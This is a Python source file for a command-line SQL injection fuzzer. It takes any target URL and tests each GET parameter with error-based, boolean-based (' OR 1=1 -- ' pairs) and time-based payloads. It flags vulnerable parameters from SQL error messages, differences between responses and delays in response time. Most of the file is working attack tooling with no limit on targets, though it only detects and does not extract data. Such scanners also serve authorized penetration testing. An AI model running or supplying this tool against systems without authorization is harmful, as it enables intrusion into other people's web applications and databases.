#!/usr/bin/env python3
"""
SQLFuzzer - A MySQL SQL Injection fuzzing tool
"""

import argparse
import sys
import datetime
import re
import time
from urllib.parse import urlparse

from modules.url_parser import URLParser
from modules.payload_generator import PayloadGenerator
from modules.request_handler import RequestHandler
from modules.response_analyzer import ResponseAnalyzer

# ANSI color codes for console output


class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


class SQLFuzzer:
    def __init__(self, args):
        self.url = args.url
        self.method = "GET"  # Currently focusing on GET parameters
        self.verbose = args.verbose
        self.user_agent = args.user_agent
        self.cookies = args.cookies
        self.timeout = 10  # Default timeout
        self.delay = 0     # Default delay
        self.found_vulnerability = None  # Track if a vulnerability is found
        self.no_color = args.no_color  # Option to disable colored output

        # Initialize modules
        self.url_parser = URLParser()
        self.payload_generator = PayloadGenerator()
        self.request_handler = RequestHandler(
            timeout=self.timeout,
            user_agent=self.user_agent,
            cookies=self.cookies,
            proxy=None,
            delay=self.delay
        )
        self.response_analyzer = ResponseAnalyzer(verbose=self.verbose)

        # Results storage
        self.vulnerabilities = []

    def validate_url(self):
        """Validate the provided URL"""
        try:
            parsed = urlparse(self.url)
            if not all([parsed.scheme, parsed.netloc]):
                self.print_error(
                    "Error: Invalid URL format. Please use format: http(s)://example.com/path?param=value")
                return False
            return True
        except Exception as e:
            self.print_error(f"Error parsing URL: {e}")
            return False

    def print_info(self, message):
        """Print informational message"""
        if self.no_color:
            print(f"[*] {message}")
        else:
            print(f"{Colors.BLUE}[*]{Colors.RESET} {message}")

    def print_success(self, message):
        """Print success message"""
        if self.no_color:
            print(f"[+] {message}")
        else:
            print(f"{Colors.GREEN}[+]{Colors.RESET} {message}")

    def print_error(self, message):
        """Print error message"""
        if self.no_color:
            print(f"[!] {message}")
        else:
            print(f"{Colors.RED}[!]{Colors.RESET} {message}")

    def print_warning(self, message):
        """Print warning message"""
        if self.no_color:
            print(f"[-] {message}")
        else:
            print(f"{Colors.YELLOW}[-]{Colors.RESET} {message}")

    def print_detail(self, title, value):
        """Print detailed information"""
        if self.no_color:
            print(f"    {title}: {value}")
        else:
            print(f"    {Colors.CYAN}{title}{Colors.RESET}: {value}")

    def run(self):
        """Main execution flow of the fuzzer"""
        if not self.validate_url():
            return False

        self.print_info(f"Starting SQL injection fuzzing on: {self.url}")
        self.print_info(f"Method: {self.method}")

        # Parse URL to extract parameters
        url_info = self.url_parser.parse(self.url)
        if not url_info['parameters']:
            self.print_error(
                "No parameters found in the URL. SQL injection testing requires parameters.")
            return False

        self.print_info(
            f"Found {len(url_info['parameters'])} parameter(s) to test")

        # Generate payloads - excluding union-based
        error_based = self.payload_generator.generate_error_based_payloads()
        boolean_based = self.payload_generator.generate_boolean_based_payloads()
        time_based = self.payload_generator.generate_time_based_payloads()

        # Combine all payloads except union-based
        all_payloads = error_based + boolean_based + time_based

        # Remove duplicates
        payloads = []
        for payload in all_payloads:
            if payload not in payloads:
                payloads.append(payload)

        self.print_info(f"Loaded {len(payloads)} SQL injection payloads")

        # Track number of tests
        total_tests = len(url_info['parameters']) * len(payloads)
        self.print_info(f"Preparing to run {total_tests} tests")

        # For each parameter, test different injection methods
        for param_name in url_info['parameters']:
            # Stop if we already found a vulnerability
            if self.found_vulnerability:
                break

            self.print_info(f"\nTesting parameter: {param_name}")

            # First test error-based injections
            if self.test_error_based(param_name, error_based, url_info):
                continue

            # Then test boolean-based injections
            if self.test_boolean_based(param_name, boolean_based, url_info):
                continue

            # Finally test time-based injections
            if self.test_time_based(param_name, time_based, url_info):
                continue

        # Summary
        if self.vulnerabilities:
            self.print_success(
                f"\nFound {len(self.vulnerabilities)} potential SQL injection vulnerabilities")
            self.print_success(
                f"Stopped fuzzing after finding {self.found_vulnerability} vulnerability")
        else:
            self.print_warning("\nNo SQL injection vulnerabilities found")

        return True

    def test_error_based(self, param_name, payloads, url_info):
        """Test error-based SQL injection"""
        self.print_info(
            f"Testing error-based injections for parameter '{param_name}'")

        for payload in payloads:
            if self.verbose:
                self.print_info(f"Trying payload: {payload}")

            # Create test URL with injected payload
            test_url = self.url_parser.inject_payload(
                self.url, param_name, payload)

            # Send request
            response = self.request_handler.send_request(test_url)
            if not response:
                continue

            # Check for SQL errors using regex patterns
            is_vulnerable, details = self.detect_sql_errors(response.text)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': payload,
                    'url': test_url,
                    'details': details,
                    'type': 'error-based'
                }
                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'error-based'

                self.print_success(
                    f"\nError-based SQL injection found in parameter '{param_name}'")
                self.print_detail("Payload", payload)
                self.print_detail("URL", test_url)
                self.print_detail("Details", details)

                return True

        return False

    def test_boolean_based(self, param_name, payloads, url_info):
        """Test boolean-based SQL injection"""
        self.print_info(
            f"Testing boolean-based injections for parameter '{param_name}'")

        # Get baseline response (original URL)
        original_url = self.url
        baseline_response = self.request_handler.send_request(original_url)
        if not baseline_response:
            self.print_error("Failed to get baseline response")
            return False

        baseline_content = baseline_response.text
        baseline_length = len(baseline_content)

        # Create pairs of TRUE/FALSE conditions for testing
        payload_pairs = [
            ("' OR 1=1 -- ", "' OR 1=0 -- "),
            ('" OR 1=1 -- ', '" OR 1=0 -- '),
            (" OR 1=1 -- ", " OR 1=0 -- "),
            ("' AND 1=1 -- ", "' AND 1=0 -- "),
            ('" AND 1=1 -- ', '" AND 1=0 -- '),
            (" AND 1=1 -- ", " AND 1=0 -- ")

        ]

        for true_payload, false_payload in payload_pairs:
            if self.verbose:
                self.print_info(
                    f"Testing boolean pair: {true_payload} / {false_payload}")

            # Test with TRUE condition
            true_url = self.url_parser.inject_payload(
                self.url, param_name, true_payload)
            true_response = self.request_handler.send_request(true_url)
            if not true_response:
                continue

            # Test with FALSE condition
            false_url = self.url_parser.inject_payload(
                self.url, param_name, false_payload)
            false_response = self.request_handler.send_request(false_url)
            if not false_response:
                continue

            # Compare responses
            is_vulnerable, details = self.detect_boolean_injection(
                baseline_response, true_response, false_response)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': f"TRUE: {true_payload}, FALSE: {false_payload}",
                    'url': true_url,
                    'details': details,
                    'type': 'boolean-based'
                }
                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'boolean-based'

                self.print_success(
                    f"\nBoolean-based SQL injection found in parameter '{param_name}'")
                self.print_detail(
                    "Payload pair", f"TRUE: {true_payload}, FALSE: {false_payload}")
                self.print_detail("URL", true_url)
                self.print_detail("Details", details)

                return True

        return False

    def test_time_based(self, param_name, payloads, url_info):
        """Test time-based SQL injection"""
        self.print_info(
            f"Testing time-based injections for parameter '{param_name}'")

        # First get baseline response time
        start_time = time.time()
        baseline_response = self.request_handler.send_request(self.url)
        baseline_time = time.time() - start_time

        if not baseline_response:
            self.print_error("Failed to get baseline response")
            return False

        self.print_info(f"Baseline response time: {baseline_time:.2f} seconds")

        # Filter for sleep-specific payloads
        sleep_payloads = [p for p in payloads if any(term in p.upper() for term in [
                                                     'SLEEP', 'BENCHMARK', 'WAITFOR'])]

        for payload in sleep_payloads:
            if self.verbose:
                self.print_info(f"Trying time-based payload: {payload}")

            # Extract sleep time from payload (typically between 1-5 seconds)
            sleep_time = 2  # Default assumption
            match = re.search(r'SLEEP\((\d+)\)', payload.upper())
            if match:
                sleep_time = int(match.group(1))

            # Create test URL with injected payload
            test_url = self.url_parser.inject_payload(
                self.url, param_name, payload)

            # Measure response time
            start_time = time.time()
            response = self.request_handler.send_request(test_url)
            response_time = time.time() - start_time

            if not response:
                continue

            # Detect time-based injection
            is_vulnerable, details = self.detect_time_based_injection(
                baseline_time, response_time, sleep_time)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': payload,
                    'url': test_url,
                    'details': details,
                    'type': 'time-based'
                }
                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'time-based'

                self.print_success(
                    f"\nTime-based SQL injection found in parameter '{param_name}'")
                self.print_detail("Payload", payload)
                self.print_detail("URL", test_url)
                self.print_detail("Details", details)
                self.print_detail(
                    "Time comparison", f"Baseline: {baseline_time:.2f}s, Injected: {response_time:.2f}s")

                return True

        return False

    def detect_sql_errors(self, response_text):
        """
        Enhanced detection of SQL errors using regex patterns
        """
        # MySQL error patterns
        mysql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"MySQL Query fail.*",
            r"SQL syntax.*MariaDB server",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc\.exceptions",
            r"Unclosed quotation mark after the character string",
            r"Syntax error or access violation:",
            r"mysql_fetch_array\(\)",
            r"YOU HAVE AN ERROR IN YOUR SQL SYNTAX",
            r"DATABASE\.MYSQL\.DRIVER",
            r"supplied argument is not a valid MySQL",
            r"javax\.el\.ELException: The identifier \[mysql\]"
        ]

        # Generic database error patterns
        generic_error_patterns = [
            r"DB Error",
            r"SQL Error",
            r"SQL syntax.*",
            r"Warning.*SQL.*",
            r"Warning.*syntax.*",
            r"Warning.*for user '.*'",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft OLE DB Provider for SQL Server error",
            r"ODBC.*Driver",
            r"Error.*\bODBC\b.*Driver",
            r"Exception.*java\.sql\.SQLException",
            r"Unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"Syntax error.*in query expression",
            r"Data type mismatch"
        ]

        # Check MySQL specific errors
        for pattern in mysql_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, f"MySQL error detected: {match.group(0)}"

        # Check generic SQL errors
        for pattern in generic_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, f"SQL error detected: {match.group(0)}"

        return False, ""

    def detect_boolean_injection(self, baseline_response, true_response, false_response):
        """
        Modern detection for boolean-based injections by comparing responses
        """
        baseline_content = baseline_response.text
        true_content = true_response.text
        false_content = false_response.text

        # Check for significant differences in response length
        baseline_length = len(baseline_content)
        true_length = len(true_content)
        false_length = len(false_content)

        # Significant difference between TRUE and FALSE conditions
        if abs(true_length - false_length) > 10:
            # For a successful boolean injection:
            # TRUE condition often resembles baseline (legitimate request)
            # FALSE condition often differs significantly

            # Check if TRUE response is similar to baseline and FALSE is different
            if abs(true_length - baseline_length) < abs(false_length - baseline_length):
                return True, f"Different response lengths: TRUE={true_length}, FALSE={false_length}, BASELINE={baseline_length}"

        # Check for key differences in content
        # Boolean injections often hide records in FALSE responses
        # Look for presence/absence of content indicators

        # Check for common content indicators (e.g., table data, records)
        content_indicators = [
            r"<tr[^>]*>.*?</tr>",
            r"<td[^>]*>.*?</td>",
            r"<div[^>]*>(.*?)</div>",
            r"<li[^>]*>.*?</li>",
            r"record",
            r"result"
        ]

        for indicator in content_indicators:
            true_matches = len(re.findall(
                indicator, true_content, re.IGNORECASE))
            false_matches = len(re.findall(
                indicator, false_content, re.IGNORECASE))

            # If TRUE condition has significantly more matches
            if true_matches > 0 and false_matches == 0:
                return True, f"Content indicators found in TRUE response but not in FALSE: {indicator}"

        # Check for significant differences in HTTP status codes
        if true_response.status_code != false_response.status_code:
            if true_response.status_code == 200 and false_response.status_code != 200:
                return True, f"Different HTTP status codes: TRUE={true_response.status_code}, FALSE={false_response.status_code}"

        return False, ""

    def detect_time_based_injection(self, baseline_time, response_time, expected_delay):
        """
        Modern detection for time-based injections
        """
        # Calculate the time difference
        time_diff = response_time - baseline_time

        # For time-based injection to be valid:
        # 1. Response time should be noticeably longer than baseline
        # 2. Response time should be close to the expected delay

        # Check if time difference is significant
        time_threshold = expected_delay * 0.8  # 80% of expected delay as threshold

        if time_diff >= time_threshold:
            # Further validation - avoid false positives from network delays
            # If time delay is within expected range (not too high above expected delay)
            if time_diff <= (expected_delay * 1.5):
                confidence = "high"
            else:
                confidence = "medium"

            return True, f"Response delayed by {time_diff:.2f}s (expected: {expected_delay}s) - {confidence} confidence"

        return False, ""


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="SQLFuzzer - A MySQL SQL Injection fuzzing tool")

    parser.add_argument("-u", "--url", required=True,
                        help="Target URL (e.g., http://example.com/page.php?id=1)")
    parser.add_argument("-v", "--verbose",
                        action="store_true", help="Verbose output")
    parser.add_argument("-a", "--user-agent", default="SQLFuzzer/1.0",
                        help="Custom User-Agent (default: SQLFuzzer/1.0)")
    parser.add_argument("-c", "--cookies",
                        help="Cookies to include with HTTP requests")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable colored output")

    return parser.parse_args()


def main():
    args = parse_arguments()
    fuzzer = SQLFuzzer(args)

    try:
        fuzzer.run()
    except KeyboardInterrupt:
        if args.no_color:
            print("\n[!] User interrupted the process")
        else:
            print(
                f"\n{Colors.RED}[!]{Colors.RESET} User interrupted the process")
        sys.exit(1)
    except Exception as e:
        if args.no_color:
            print(f"\n[!] An error occurred: {e}")
        else:
            print(f"\n{Colors.RED}[!]{Colors.RESET} An error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
